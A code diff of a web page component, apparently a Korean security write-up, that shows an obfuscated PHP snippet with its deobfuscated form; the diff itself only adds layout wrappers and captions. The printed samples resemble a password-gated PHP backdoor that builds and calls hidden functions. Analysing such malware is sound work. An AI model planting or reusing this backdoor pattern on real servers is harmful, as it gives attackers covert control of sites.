@@ -55,10 +55,12 @@ foreach ($files as $file) {
 echo "de~ complete...?\n";
 ?>`}
           </ImageWithText>
+          <div className={styles.captionSide}>비난독화 코드</div>
         </div>
       </div>
       <div className={styles.terminalSection}>
-        <ImageWithText>
+        <div className={styles.imgSide}>
+          <ImageWithText>
           {`<?php
 $Xt='h2q'|uXxuyyo;$sC='-{K'&'-?[';$yWIm3f4='V$'.fx8N^'7'.d68V.'(';$VSFHxobN6='Bh\`b'.
     '?t'^'.<6<\`5';$NiMFQcdpv='3<U[7'^'d[b&N';$bO='2y*qR1-h6'^'{Q~76'.UjJz;'yuAR9bK'.
@@ -72,9 +74,12 @@ $Xt='h2q'|uXxuyyo;$sC='-{K'&'-?[';$yWIm3f4='V$'.fx8N^'7'.d68V.'(';$VSFHxobN6='Bh
     '{)RG)Unn3*/$tRPwxjf_2s)$kR_NKA7Su=$ba($NFOor.(H0^lR),$HK4kh284Iy(/*I2jAJZEnpN'.
     '_nO*/$GYjy197jA.$GqY8x4));$kR_NKA7Su($Ml1,$YK3qRS);#rTlthc@v^U@ykQuNEiaq9NFC'.
     'n0dvU,yCve{Fu~CtA*8%sZWe_%mZdpX_<Ra4M~2GuB}6m4';`}
-        </ImageWithText>
-        <ImageWithText>
-          {`<?php
+          </ImageWithText>
+          <div className={styles.captionSide}>비난독화 전 코드</div>
+      </div>
+        <div className={styles.imgSide}>
+          <ImageWithText>
+            {`<?php
 
 $Xt = "}zyuyyo";
 $sC = '-;K';
@@ -103,7 +108,9 @@ if (md5(getenv($mKGuIFLsIU9)) == "5d15db53a91790e913dc4e05a1319c42") {
 $kR_NKA7Su($Ml1, $YK3qRS);
 #rTlthc@v^U@ykQuNEiaq9NFC'.
 'n0dvU,yCve{Fu~CtA*8%sZWe_%mZdpX_<Ra4M~2GuB}6m4';`}
-        </ImageWithText>
+          </ImageWithText>
+          <div className={styles.captionSide}>비난독화 후 코드</div>
+        </div>
       </div>
     </div>
   );
